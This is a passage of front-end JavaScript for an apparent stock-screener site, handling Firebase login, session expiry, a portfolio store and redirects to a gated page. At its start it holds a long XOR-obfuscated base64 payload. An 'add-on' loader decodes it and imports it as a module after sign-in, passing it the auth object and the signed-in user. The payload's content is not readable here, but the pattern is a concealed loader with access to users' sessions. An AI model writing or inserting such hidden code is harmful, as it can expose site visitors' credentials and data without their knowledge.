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";
function unpack(t) {
  const b = Uint8Array.from(atob(t), (c) => c.charCodeAt(0));
  for (let i = 0; i < b.length; i++) b[i] ^= (i * 7 + 13) & 255;
  return new TextDecoder().decode(b);
}
async function loadExt(u) {
  if (!PACK) return;
  const url = URL.createObjectURL(new Blob([unpack(PACK)], { type: "text/javascript" }));
  try {
    const m = await import(url);
    await m.default({ app, auth, user: u, gated: GATED, addItem, syncLock, esc, $ });
  } catch (e) { console.warn("add-on:", e); }
  finally { URL.revokeObjectURL(url); }
}
idle(presence);                                         // online counter: after the page has settled, never before it shows
idle(countVisitor, 4000);

// ---------- page wiring ----------
const SIGNED_HINT = "hni_signed";                          // "1" = signed in last time (only a hint: Fundamentals checks for real)
const hinted = () => { try { return localStorage.getItem(SIGNED_HINT) === "1"; } catch (e) { return false; } };
let current = null;
const ready = new Promise((resolve) => {
  onAuthStateChanged(auth, async (u) => {
    if (u && expired(u)) { await signOut(auth); u = null; }   // 7-day session limit
    current = u;
    try { localStorage.setItem(SIGNED_HINT, u ? "1" : "0"); } catch (e) {}   // lets the next visit open Fundamentals instantly
    resolve();
    if (GATED && !u) {                                        // no login: back to the screener with the popup open
      location.replace(HOME + "?login=" + encodeURIComponent(location.pathname.replace(/^\//, "") + location.hash));
      return;
    }
    if (GATED) document.documentElement.classList.add("auth-ok");   // show the page at once
    else paintSlot(u);                                         // screener: Login button or the user menu
    if (!u) return;
    // Portfolio tab: the page saves / loads the user's holdings through this (Firestore hni_portfolio/{uid}, owner only)
    window.hniStore = {
      load: async () => { await needFS(); const d = await getDoc(doc(db, PORTFOLIO, u.uid)); return d.exists() ? d.data() : {}; },             // {txns, rates} (or old {items})
      save: async (data) => { await needFS(); return setDoc(doc(db, PORTFOLIO, u.uid), { txns: data.txns || [], rates: data.rates || {}, updated: serverTimestamp() }); },
      market: async () => { await needFS(); const d = await getDoc(doc(db, ...MARKET)); return d.exists() ? d.data() : null; },
      canRefresh: () => !!LTP_HOOK,                          // every signed-in user
      // start the live-price job → {ok} | {error, running}
      refresh: async () => {
        const r = await fetch(LTP_HOOK, { method: "POST", headers: { Authorization: "Bearer " + await u.getIdToken() } });
        return r.json().catch(() => ({ error: "HTTP " + r.status }));
      },
    };
    window.dispatchEvent(new Event("hni-ready"));
    if (GATED) showUser(u);
    idle(() => { record(u); loadExt(u); }, 1500);
  });
});

if (!GATED) {
  // screener: the Fundamentals button. Its tap is caught by a small script in the page itself (so the FIRST tap works
  // even before this file has loaded): it disables the button, shows "Checking login…" and then calls this.
  window.hniAuthGo = async (href) => {
    window.hniPending = null;
    // signed in last time → go at once (the Fundamentals page confirms the login itself, and sends you back if needed)
    if (current || hinted()) { location.href = href; return; }
    await ready;
    if (current) { location.href = href; return; }
    if (window.hniDone) window.hniDone();                      // not signed in: "Checking login…" → the login box
    openPopup(href);
  };
  if (window.hniPending) window.hniAuthGo(window.hniPending);   // tapped while this file was still loading
  // signed-in visitors: fetch the Fundamentals page quietly in the background, so it opens instantly (not for everyone:
  // it is ~260 KB, and free hosting has a daily transfer limit)
  ready.then(() => {
    const c = navigator.connection;
    if (!current || (c && (c.saveData || /2g/.test(c.effectiveType || "")))) return;
    const a = document.querySelector("[data-auth-link]");
    if (!a) return;
    idle(() => { const l = document.createElement("link"); l.rel = "prefetch"; l.href = a.href; document.head.appendChild(l); }, 3000);
  });
  const want = new URLSearchParams(location.search).get("login");
  if (want != null) {
    history.replaceState(null, "", location.pathname + location.hash);          // clean the address bar
    ready.then(() => {
      let target = "fundamentals";                                              // only pages on this site
      try { const t = new URL(want, location.href); if (want && t.origin === location.origin) target = t.pathname + t.hash; } catch (e) {}
      if (current) location.href = target; else openPopup(target);
    });
  }
}
